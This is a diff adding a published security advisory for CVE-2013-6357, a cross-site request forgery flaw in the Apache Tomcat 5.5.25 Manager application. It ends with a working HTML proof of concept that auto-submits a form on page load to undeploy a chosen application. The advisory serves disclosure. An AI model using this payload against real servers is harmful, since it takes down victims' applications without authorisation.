@@ -1,0 +1,44 @@
++--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title     :  Apache Tomcat 5.5.25 CSRF Vulnerabilities
+# Date              :  10-24-2013
+# Author            :  Ivano Binetti (http://ivanobinetti.com)
+# Author            :  Gianmarco Pirozzi (http://www.linkedin.com/pub/gianmarco-pirozzi/63/80b/2a5)
+# Vendor site       :  http://tomcat.apache.org/
+# Version           :  Apache Tomcat 5.5.25 and below (other versions could be affected)
+# Tested on         :  Apache Tomcat 5.5.25
+# Original Advisory :  http://www.webapp-security.com/2013/11/apache-tomcat-5-5-25-deployundeploystartstop-applications/
+# CVE-ID            :  CVE-2013-6357
++---------------------------------------------------------------------------------------------------------------------------------+
+Summary
+
+1)Introduction
+2)Vulnerability Description
+3)Exploit
+ 3.1 Undeploy Applications
++---------------------------------------------------------------------------------------------------------------------------------+
+
+1) Introduction
+Apache Tomcat is an open source software implementation of the Java Servlet and JavaServer Pages technologies. 
+The Java Servlet and JavaServer Pages specifications are developed under the Java Community Process.
+
+2) Vulnerability Description
+Apache Tomcat 5.5.25 and below (other versions could be affected) is prone to a CSRF vulnerability affecting the Manager application
+(which is the component utilized to start/stop/deploy/undeploy applications) in order to perform the following malicious activities:
+
+- stop an existing application
+- undeploy an existing application
+- deploy a new application
+
+In this Advisory I will only demonstate how to automatically undeploy an existing application.
+
+3) Exploit 
+ 3.1 Undeploy Applications
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to Undeploy an Application</H2>
+ <form method="POST" name="form0" action="http://<tomcat_ip>:<tomcat_tcp/port>/manager/html/undeploy?path=/<name_of_application_to_undeploy>">
+ </form>
+ </body>
+ </html>
++----------------------------------------------------------------------------------------------------------------------------------+
+
